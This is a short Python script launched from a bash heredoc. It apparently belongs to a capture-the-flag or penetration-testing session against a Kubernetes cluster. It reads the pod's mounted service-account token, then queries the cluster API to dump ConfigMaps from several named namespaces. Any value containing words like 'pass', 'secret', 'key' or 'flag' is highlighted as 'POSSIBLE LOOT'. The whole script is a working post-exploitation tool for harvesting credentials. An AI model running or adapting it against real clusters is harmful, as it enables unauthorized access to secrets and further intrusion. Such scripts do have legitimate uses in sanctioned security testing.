python3 - <<'EOF'
import os, sys, json, ssl
from urllib.request import Request, urlopen

# === CONFIGURATION ===
SA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH = os.path.join(SA_PATH, "token")
CACERT_PATH = os.path.join(SA_PATH, "ca.crt")
APISERVER = "https://kubernetes.default.svc"

# === VISUALS ===
class C:
    G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; E = "\033[0m"

# === SETUP ===
with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)

def k8s_api(path):
    url = f"{APISERVER}{path}"
    req = Request(url, headers={"Authorization": f"Bearer {TOKEN}"})
    try:
        with urlopen(req, context=SSL_CTX, timeout=3) as res:
            return json.loads(res.read())
    except Exception as e: return None

# === MAIN LOOT LOOP ===
print(f"{C.B}=== 📄 CONFIGMAP DUMPER ==={C.E}")

# We target the namespaces where you have 'list configmaps' permission
# Based on your previous scan: internal, dev-internal
targets = ["internal", "dev-internal", "orthanc", "wordpress"]

for ns in targets:
    print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
    
    # 1. Try to list ConfigMaps
    resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
    
    if not resp or "items" not in resp:
        print(f"  ❌ Access Denied or Empty")
        continue

    print(f"  ✅ Found {len(resp['items'])} ConfigMaps")
    
    # 2. Iterate and Print Data
    for cm in resp['items']:
        name = cm['metadata']['name']
        # Skip boring default K8s stuff
        if name == "kube-root-ca.crt": continue
        
        print(f"    📄 {C.Y}{name}{C.E}")
        
        if "data" in cm:
            for key, val in cm["data"].items():
                # Check for interesting content
                if any(x in val.lower() for x in ["flag", "pass", "key", "secret", "user", "admin"]):
                    print(f"      🚨 {C.G}POSSIBLE LOOT IN '{key}':{C.E}")
                    print(f"      {val}")
                else:
                    # Print first 100 chars just in case
                    preview = val[:100].replace('\n', ' ')
                    print(f"      {key}: {preview}...")
        else:
            print("      (No data)")

print(f"\n{C.G}Done.{C.E}")
EOF
